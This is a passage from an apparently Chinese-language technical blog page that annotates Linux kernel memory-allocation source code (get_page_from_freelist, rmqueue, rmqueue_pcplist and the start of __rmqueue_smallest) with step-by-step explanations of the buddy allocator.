class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    *alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据标志位判断页面是否需要回写，Dirty zone 的平衡只在快速分配中做</span></span><br><span class="line">    ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出 zone_list 第一个区作为 preferred_zoneref</span></span><br><span class="line">    ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">                    ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>从指定的节点中一个 <code>zone_list</code> 作为可用区的列表</li><li>根据 cpuset 情况设置标志位</li><li>判断是否页面需要回写</li><li>取出 <code>zone_list</code> 第一个区作为 <code>preferred_zoneref</code></li></ol><h5 id="快速分配：get-page-from-freelist-函数"><a href="#快速分配：get-page-from-freelist-函数" class="headerlink" title="快速分配：get_page_from_freelist 函数"></a>快速分配：<code>get_page_from_freelist</code> 函数</h5><p>通过 <code>get_page_from_freelist</code> 遍历 <code>alloc_context</code> 的 <code>zone_list</code> 中获取内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *</span><br><span class="line"><span class="title function_">get_page_from_freelist</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order, <span class="type">int</span> alloc_flags,</span></span><br><span class="line"><span class="params">                        <span class="type">const</span> <span class="keyword">struct</span> alloc_context *ac)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">last_pgdat_dirty_limit</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">bool</span> no_fallback;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line">    <span class="comment">// 扫描 zonelist, 寻找有足够空闲空间的 zone</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置避免内存碎片的标志位</span></span><br><span class="line">    no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT;</span><br><span class="line">    <span class="comment">// 首先扫描 preferred_zoneref</span></span><br><span class="line">    z = ac-&gt;preferred_zoneref;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个封装 for 循环的宏，从 z 开始遍历 zone_list 可使用的 zone</span></span><br><span class="line">    for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,</span><br><span class="line">                    ac-&gt;nodemask) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> mark;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果开启 cpuset，检查当前 zone 是否满足要求</span></span><br><span class="line">        <span class="keyword">if</span> (cpusets_enabled() &amp;&amp;</span><br><span class="line">            (alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;</span><br><span class="line">            !__cpuset_zone_allowed(zone, gfp_mask))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当需要分配需要回写的页，而 zone 中脏页达到限制后需要跳过</span></span><br><span class="line">        <span class="keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;</span><br><span class="line">            <span class="keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;</span><br><span class="line">                last_pgdat_dirty_limit = zone-&gt;zone_pgdat;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当 node 数量大于 1，且当前 zone 非 preferred_zone</span></span><br><span class="line">        <span class="keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">            zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;</span><br><span class="line">            <span class="type">int</span> local_nid;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 如果遍历到离 CPU 比较远的 zone，去掉避免碎片的标志</span></span><br><span class="line"><span class="comment">             * 即倾向于 local node 中的 zone，即使会产生内存碎片</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);</span><br><span class="line">            <span class="keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;</span><br><span class="line">                alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line">                <span class="keyword">goto</span> retry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取水位线，并做检查</span></span><br><span class="line">        mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);</span><br><span class="line">        <span class="keyword">if</span> (!zone_watermark_fast(zone, order, mark,</span><br><span class="line">                       ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">                       gfp_mask)) &#123;</span><br><span class="line">            <span class="comment">// 如果水位线没通过，进入下面流程</span></span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">            <span class="comment">// 如果该 zone 包含 deferred pages，可以尝试扩展该 zone</span></span><br><span class="line">            <span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line">                    <span class="keyword">goto</span> try_this_zone;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果标志忽略水位线，直接尝试从该 zone 进行分配</span></span><br><span class="line">            <span class="keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)</span><br><span class="line">                <span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (node_reclaim_mode == <span class="number">0</span> ||</span><br><span class="line">                !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 进行页面回收</span></span><br><span class="line">            ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);</span><br><span class="line">            <span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">            <span class="keyword">case</span> NODE_RECLAIM_NOSCAN:</span><br><span class="line">                <span class="comment">// 不扫描</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> NODE_RECLAIM_FULL:</span><br><span class="line">                <span class="comment">// 扫描但不能回收</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// 回收后是否达标</span></span><br><span class="line">                <span class="keyword">if</span> (zone_watermark_ok(zone, order, mark,</span><br><span class="line">                    ac-&gt;highest_zoneidx, alloc_flags))</span><br><span class="line">                    <span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">try_this_zone:</span><br><span class="line">        <span class="comment">// 正式进入页面分配</span></span><br><span class="line">        page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,</span><br><span class="line">                gfp_mask, alloc_flags, ac-&gt;migratetype);</span><br><span class="line">        <span class="keyword">if</span> (page) &#123;</span><br><span class="line">            <span class="comment">// 取到了，则初始化页面并返回</span></span><br><span class="line">            prep_new_page(page, order, gfp_mask, alloc_flags);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))</span><br><span class="line">                reserve_highatomic_pageblock(page, zone, order);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> page;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">            <span class="comment">// 没取到，如果该 zone 有 deferred pages，扩展后再试一遍</span></span><br><span class="line">            <span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line">                    <span class="keyword">goto</span> try_this_zone;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 在一台 UMA machine 上可能所有 zone 都是内存碎片</span></span><br><span class="line"><span class="comment">     * 无法避免碎片，重试</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (no_fallback) &#123;</span><br><span class="line">        alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>从 <code>preferred_zoneref</code> 开始遍历 <code>zone_list</code> 寻找满足要求的 zone<ol><li>如果开启了 cpuset，检查当前 zone 是否满足要求，若否，寻找下一个 zone</li><li>检查当前 zone 的脏页数量达到限制，若否，寻找下一个 zone</li><li>检查当前 zone 是否属于另一个 node，若是，则清除 <code>ALLOC_NOFRAGMENT</code> 标志，重新遍历，因为 local node 重要性大于内存碎片</li><li>检查水位线是否达标<ol><li>若设置了 <code>ALLOC_NO_WATERMARKS</code> 忽略检查</li><li>若未达标，调用 <code>node_reclaim</code> 函数进行页面回收</li><li>若回收后 zone 仍不满足要求，则寻找下一个 zone</li></ol></li></ol></li><li>调用 <code>rmqueue</code> 函数，对满足要求的 zone 进行内存分配，即 Buddy System 分配算法</li></ol><p>下面仔细看看 Buddy System 分配算法</p><h5 id="rmqueue-函数"><a href="#rmqueue-函数" class="headerlink" title="rmqueue 函数"></a><code>rmqueue</code> 函数</h5><figure class="highlight c"><figcaption><span>mm/page_alloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="keyword">struct</span> page *<span class="title function_">rmqueue</span><span class="params">(<span class="keyword">struct</span> zone *preferred_zone,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params">            <span class="type">gfp_t</span> gfp_flags, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> migratetype)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 大多数情况只需要一个页的大小</span></span><br><span class="line">    <span class="keyword">if</span> (likely(order == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * MIGRATE_MOVABLE pcplist 可能在 CMA 区域有页面</span></span><br><span class="line"><span class="comment">         * 如果 CMA 开启且不分配 CMA，则需要略过 MIGRATE_MOVABLE 的页面</span></span><br><span class="line"><span class="comment">         * 即当 CMA 没开启，或分配标志有 ALLOC_CMA，或页面不是 MIGRATE_MOVABLE</span></span><br><span class="line"><span class="comment">         * 都可以使用 pcplist</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||</span><br><span class="line">                migratetype != MIGRATE_MOVABLE) &#123;</span><br><span class="line">            page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,</span><br><span class="line">                    migratetype, alloc_flags);</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 不希望调用者尝试分配 order &gt; 1 的页面且带有 __GFP_NOFAIL 标志</span></span><br><span class="line"><span class="comment">     * 可能会导致无限尝试分配失败</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="number">1</span>));</span><br><span class="line">    <span class="comment">// 加锁，开始内存分配了</span></span><br><span class="line">    spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        page = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * HIGHATOMIC 区域是为高 order 分配保留的，因此 0 order 应该跳过</span></span><br><span class="line"><span class="comment">         * 当 order &gt; 0，且有 ALLOC_HARDER 标志（高优先级分配）</span></span><br><span class="line"><span class="comment">         * 调用 __rmqueue_smallest 分配</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (order &gt; <span class="number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;</span><br><span class="line">            page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line">            <span class="keyword">if</span> (page)</span><br><span class="line">                trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 __rmqueue 分配</span></span><br><span class="line">        <span class="keyword">if</span> (!page)</span><br><span class="line">            page = __rmqueue(zone, order, migratetype, alloc_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后检查分配的页面是否是新页面，防止 overlap</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (page &amp;&amp; check_new_pages(page, order));</span><br><span class="line">    <span class="comment">// 解锁，分配完成</span></span><br><span class="line">    spin_unlock(&amp;zone-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span> (!page)</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    __mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">                  get_pcppage_migratetype(page));</span><br><span class="line"></span><br><span class="line">    __count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">    zone_statistics(preferred_zone, zone);</span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;</span><br><span class="line">        clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);</span><br><span class="line">        wakeup_kswapd(zone, <span class="number">0</span>, <span class="number">0</span>, zone_idx(zone));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line"></span><br><span class="line">failed:</span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>对于一个页大小的页面，除了 CMA 开启且不分配 CMA 的 MIGRATE_MOVABLE 页面，都可以通过 <code>rmqueue_pcplist</code> 从 CPU 的内存仓库中分配<ul><li>CMA 一般用于嵌入式，目的是分配一块连续的物理内存，这里不细讲</li></ul></li><li>如果 order &gt; 0 且分配优先级比较高，则调用 <code>__rmqueue_smallest</code> 分配</li><li>否则都调用 <code>__rmqueue</code> 分配内存</li><li>对页面进行检查是否是新页，不是则跳到第 2 步重新分配</li></ol><h6 id="rmqueue-pcplist-函数"><a href="#rmqueue-pcplist-函数" class="headerlink" title="rmqueue_pcplist 函数"></a><code>rmqueue_pcplist</code> 函数</h6><p>从 <code>per_cpu_pageset</code> 中分配 order-0（单页）页面</p><figure class="highlight c"><figcaption><span>mm/page_alloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">rmqueue_pcplist</span><span class="params">(<span class="keyword">struct</span> zone *preferred_zone,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> zone *zone, <span class="type">gfp_t</span> gfp_flags,</span></span><br><span class="line"><span class="params">             <span class="type">int</span> migratetype, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭中断</span></span><br><span class="line">    local_irq_save(flags);</span><br><span class="line">    <span class="comment">// 取出 pcplist</span></span><br><span class="line">    pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;</span><br><span class="line">    <span class="built_in">list</span> = &amp;pcp-&gt;lists[migratetype];</span><br><span class="line">    <span class="comment">// 分配页面</span></span><br><span class="line">    page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="built_in">list</span>);</span><br><span class="line">    <span class="keyword">if</span> (page) &#123;</span><br><span class="line">        __count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span>);</span><br><span class="line">        zone_statistics(preferred_zone, zone);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 开启中断</span></span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_pcplist</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class">            <span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 如果 pcplist 为空</span></span><br><span class="line">        <span class="keyword">if</span> (list_empty(<span class="built_in">list</span>)) &#123;</span><br><span class="line">            <span class="comment">// 调用 rmqueue_bulk 函数从 zone 中获取 batch 个页面到 pcplist 中</span></span><br><span class="line">            <span class="comment">// 其中会调用 __rmqueue 函数从 zone 取页面</span></span><br><span class="line">            pcp-&gt;count += rmqueue_bulk(zone, <span class="number">0</span>,</span><br><span class="line">                    READ_ONCE(pcp-&gt;batch), <span class="built_in">list</span>,</span><br><span class="line">                    migratetype, alloc_flags);</span><br><span class="line">            <span class="keyword">if</span> (unlikely(list_empty(<span class="built_in">list</span>)))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从链表中脱链</span></span><br><span class="line">        page = list_first_entry(<span class="built_in">list</span>, <span class="keyword">struct</span> page, lru);</span><br><span class="line">        list_del(&amp;page-&gt;lru);</span><br><span class="line">        pcp-&gt;count--;</span><br><span class="line">    &#125; <span class="keyword">while</span> (check_new_pcp(page));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>取出 pcplist</li><li>调用 <code>__rmqueue_pcplist</code> 函数分配页面<ol><li>如果 pcplist 为空，调用 <code>rmqueue_bulk</code> 函数从当前 zone 获取若干页面加入到 pcplist 中</li><li>从 pcplist 链表中脱链，取出一个页面</li></ol></li><li>返回页面</li></ol><h6 id="rmqueue-smallest-函数"><a href="#rmqueue-smallest-函数" class="headerlink" title="__rmqueue_smallest 函数"></a><code>__rmqueue_smallest</code> 函数</h6><p>核心函数</p><figure class="highlight c"><figcaption><span>mm/page_alloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_smallest</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">migratetype</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> current_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> *<span class="title">area</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 zone 中寻找合适大小的页面，</span></span><br><span class="line"><span class="keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;</span><br><span class="line">        <span class="comment">// 取出 free_area 从中取出页面</span></span><br><span class="line">area = 